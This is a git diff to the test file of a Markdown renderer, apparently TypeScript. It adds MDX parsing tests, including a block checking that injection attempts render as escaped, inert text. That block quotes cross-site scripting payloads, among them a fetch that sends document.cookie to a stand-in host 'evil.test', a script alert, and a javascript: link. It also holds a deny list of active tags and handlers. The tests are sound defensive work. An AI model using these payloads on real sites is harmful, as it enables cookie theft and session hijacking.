@@ -7,6 +7,8 @@ import alerts from "./fixtures/alerts.md?raw";
 import frontmatterDocs from "./fixtures/frontmatter-docs.md?raw";
 import frontmatterInvalid from "./fixtures/frontmatter-invalid.md?raw";
 import frontmatterNested from "./fixtures/frontmatter-nested.md?raw";
+import mdxDocusaurus from "./fixtures/mdx-docusaurus.mdx?raw";
+import mdxXss from "./fixtures/mdx-xss.mdx?raw";
 import rfd from "./fixtures/rfd-0042-rendered-review.md?raw";
 import ruleNotFrontmatter from "./fixtures/rule-not-frontmatter.md?raw";
 import xss from "./fixtures/xss.md?raw";
@@ -22,7 +24,10 @@ const fixtures = {
   "frontmatter-nested": frontmatterNested,
   "frontmatter-invalid": frontmatterInvalid,
   "rule-not-frontmatter": ruleNotFrontmatter,
+  "mdx-docusaurus": mdxDocusaurus,
+  "mdx-xss": mdxXss,
 };
+const formatOf = (name: string) => (name.startsWith("mdx-") ? "mdx" : "md");
 
 /** Offset of a 1-based line/column, computed independently of the parser. */
 function offsetOf(source: string, { line, column }: SourcePoint): number {
@@ -51,6 +56,8 @@ function sourceContains(source: string, range: SourceRange, text: string, quoted
 
 /** Text the pipeline generates without source (footnote chrome and reference numbers). */
 const GENERATED_TEXT = new Set(["Footnotes", "↩", "1", "Note", "Tip", "Important", "Warning", "Caution"]);
+/** Labels on inert MDX source ("MDX", "MDX component <Tabs>", ...). */
+const isGenerated = (text: string) => GENERATED_TEXT.has(text) || /^MDX( |$)/.test(text);
 
 describe("source containment check", () => {
   const whole = (src: string) => ({
@@ -73,7 +80,7 @@ describe("source containment check", () => {
 });
 
 describe.each(Object.entries(fixtures))("%s fixture", (name, source) => {
-  const doc = renderMarkdown(source);
+  const doc = renderMarkdown(source, { format: formatOf(name) });
 
   test("renders to the reviewed snapshot", async () => {
     await expect(toHtml(doc.tree)).toMatchFileSnapshot(`./fixtures/${name}.html`);
@@ -101,12 +108,12 @@ describe.each(Object.entries(fixtures))("%s fixture", (name, source) => {
       if (node.type === "text" && node.value.trim()) {
         const range = node.position ? { start: node.position.start, end: node.position.end } : owner;
         if (!range) {
-          expect(GENERATED_TEXT, `unmapped text ${JSON.stringify(node.value)}`).toContain(node.value);
+          expect(isGenerated(node.value), `unmapped text ${JSON.stringify(node.value)}`).toBe(true);
         } else {
           expectValidRange(source, range as SourceRange);
           // trim(): remark-rehype appends a space to the text before a footnote back-reference.
           const text = node.value.trim();
-          if (!GENERATED_TEXT.has(node.value))
+          if (!isGenerated(node.value))
             expect(sourceContains(source, range as SourceRange, text, quoted), JSON.stringify(text)).toBe(true);
         }
       }
@@ -121,7 +128,7 @@ describe.each(Object.entries(fixtures))("%s fixture", (name, source) => {
   });
 
   test("is deterministic", () => {
-    expect(renderMarkdown(source)).toEqual(doc);
+    expect(renderMarkdown(source, { format: formatOf(name) })).toEqual(doc);
   });
 });
 
@@ -400,4 +407,116 @@ test("CRLF sources keep line numbers and raw offsets", () => {
     lf.nodes.map((n) => [n.type, n.range.start.line, n.range.start.column, n.text]),
   );
   expect(crlf.nodes.find((n) => n.type === "emphasis")!.range.start.offset).toBe(12);
+});
+
+describe("MDX", () => {
+  const mdx = (source: string) => renderMarkdown(source, { format: "mdx" });
+  const html = (source: string) =>
+    toHtml(mdx(source).tree)
+      .trim()
+      .replace(/ data-rr-(id="\d+"|unmapped)/g, "");
+  const doc = mdx(mdxDocusaurus);
+  const out = toHtml(doc.tree).replace(/ data-rr-(id="\d+"|unmapped)/g, "");
+  const lineOf = (text: string) => mdxDocusaurus.split("\n").findIndex((l) => l.startsWith(text)) + 1;
+  const at = (l: number) => blocksForLines(doc, l, l).map((n) => `${n.type}:${n.text.split("\n")[0]}`);
+
+  test("Markdown files are parsed as Markdown, not MDX", () => {
+    const out = toHtml(renderMarkdown("Braces {1 + 1} and <Tabs /> stay Markdown.").tree);
+    expect(out).toContain("Braces {1 + 1} and  stay Markdown.");
+    expect(out).not.toContain("rr-mdx");
+  });
+
+  test("imports and exports show as a labelled, inert source block", () => {
+    expect(html("import Tabs from '@theme/Tabs';\nexport const a = 1;\n")).toBe(
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX import/export</span><pre><code>import Tabs from \'@theme/Tabs\';\nexport const a = 1;\n</code></pre></div>',
+    );
+  });
+
+  test("flow expressions show as a labelled source block", () => {
+    expect(html("{/* note */}")).toBe(
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX expression</span><pre><code>{/* note */}\n</code></pre></div>',
+    );
+  });
+
+  test("a component without children shows its source, labelled with its name", () => {
+    expect(html('<DocCardList items={[1]} />')).toBe(
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX component &#x3C;DocCardList></span><pre><code>&#x3C;DocCardList items={[1]} />\n</code></pre></div>',
+    );
+  });
+
+  test("a component's Markdown children render between its tags' source", () => {
+    expect(html('<Tabs groupId="pm">\n\nSome *text*.\n\n</Tabs>')).toBe(
+      '<div class="rr-mdx"><span class="rr-mdx-label">MDX component &#x3C;Tabs></span><pre><code>&#x3C;Tabs groupId="pm">\n</code></pre>\n<p>Some <em>text</em>.</p>\n<pre><code>&#x3C;/Tabs>\n</code></pre></div>',
+    );
+  });
+
+  test("inline components and expressions show as labelled inline source", () => {
+    expect(html("A {1 + 1} and <Kbd>Ctrl</Kbd>.")).toBe(
+      '<p>A <span class="rr-mdx-inline"><span class="rr-mdx-label">MDX</span><code>{1 + 1}</code></span> and <span class="rr-mdx-inline"><span class="rr-mdx-label">MDX</span><code>&#x3C;Kbd>Ctrl&#x3C;/Kbd></code></span>.</p>',
+    );
+  });
+
+  test("the Docusaurus fixture renders its Markdown content", () => {
+    expect(out).toMatch(/^<dl class="rr-frontmatter">/);
+    expect(out).toContain('<h1 id="user-content-installation">Installation</h1>');
+    expect(out).toContain('<a href="https://nodejs.org/" target="_blank" rel="noopener noreferrer">Node.js site</a>');
+    expect(out).toContain("<p>Install with npm:</p>");
+    expect(out).toContain('<pre><code class="language-bash">npm install @docusaurus/core\n</code></pre>');
+    expect(out).toContain("<p>Install with <em>yarn</em>.</p>");
+    // Admonitions are not an MDX feature (a Docusaurus plugin adds them); they stay text.
+    expect(out).toContain("<p>:::note</p>");
+    expect(out.match(/class="rr-mdx-label">MDX component &#x3C;TabItem>/g)).toHaveLength(2);
+  });
+
+  test("every inert block's text is its exact source", () => {
+    const blocks = doc.nodes.filter((n) => n.tagName === "pre" && n.type.startsWith("mdx"));
+    expect(blocks.length).toBeGreaterThan(0);
+    for (const n of blocks)
+      expect(normalizeText(mdxDocusaurus.slice(n.range.start.offset, n.range.end.offset))).toBe(n.text.trimEnd());
+  });
+
+  test("line comments resolve to inert blocks and to Markdown inside components", () => {
+    expect(at(lineOf("import TabItem"))).toEqual(["mdxjsEsm:MDX import/export"]);
+    expect(at(lineOf("<Tabs "))).toEqual(["mdxJsxFlowElement:MDX component <Tabs>"]);
+    expect(at(lineOf('  <TabItem value="yarn"'))).toEqual(["mdxJsxFlowElement:MDX component <TabItem>"]);
+    expect(at(lineOf("Install with npm"))).toEqual(["paragraph:Install with npm:"]);
+    expect(at(lineOf("npm install"))).toEqual(["code:npm install @docusaurus/core"]);
+    expect(at(lineOf("{/*"))).toEqual(["mdxFlowExpression:MDX expression"]);
+    expect(at(lineOf("<DocCardList"))).toEqual(["mdxJsxFlowElement:MDX component <DocCardList>"]);
+    expect(at(lineOf("Use <Highlight"))).toEqual([expect.stringMatching(/^paragraph:Use MDX<Highlight/)]);
+  });
+
+  test("invalid MDX throws a concise error with its position", () => {
+    expect(() => mdx("# Title\n\n<Tabs>\n\nNever closed.\n")).toThrow(/^Invalid MDX at line \d+, column \d+: .+/);
+    expect(() => mdx("Bad {expression\n")).toThrow(/^Invalid MDX/);
+  });
+
+  describe("injection attempts are inert", () => {
+    const doc = mdx(mdxXss);
+    const out = toHtml(doc.tree);
+    const elements: Element[] = [];
+    const collect = (node: Root | Element) =>
+      node.children.forEach((c) => c.type === "element" && (elements.push(c), collect(c)));
+    collect(doc.tree);
+
+    test("no active elements, event handlers or unsafe URLs", () => {
+      const banned = ["script", "img", "iframe", "svg", "object", "embed", "form"];
+      expect(elements.map((e) => e.tagName).filter((t) => banned.includes(t))).toEqual([]);
+      for (const { tagName, properties } of elements) {
+        expect(["div", "span", "pre", "code", "p", "a", "h1"]).toContain(tagName);
+        for (const [name, value] of Object.entries(properties)) {
+          expect(name).not.toMatch(/^on|^style$|dangerously/i);
+          if (name === "href" || name === "src") expect(String(value)).toMatch(/^(https?:|mailto:|#|[^:]*$)/i);
+        }
+      }
+    });
+
+    test("the JSX, ESM and expressions show as escaped source text", () => {
+      expect(out).toContain("export default function Layout({ children }) { exec(");
+      expect(out).toContain("&#x3C;div onClick={() => alert(1)} dangerouslySetInnerHTML=");
+      expect(out).toContain("&#x3C;script>{`alert(document.cookie)`}&#x3C;/script>");
+      expect(out).toContain("{fetch('https://evil.test/' + document.cookie)}");
+      expect(out).toContain('&#x3C;a href="javascript:alert(2)">inline&#x3C;/a>');
+    });
+  });
 });
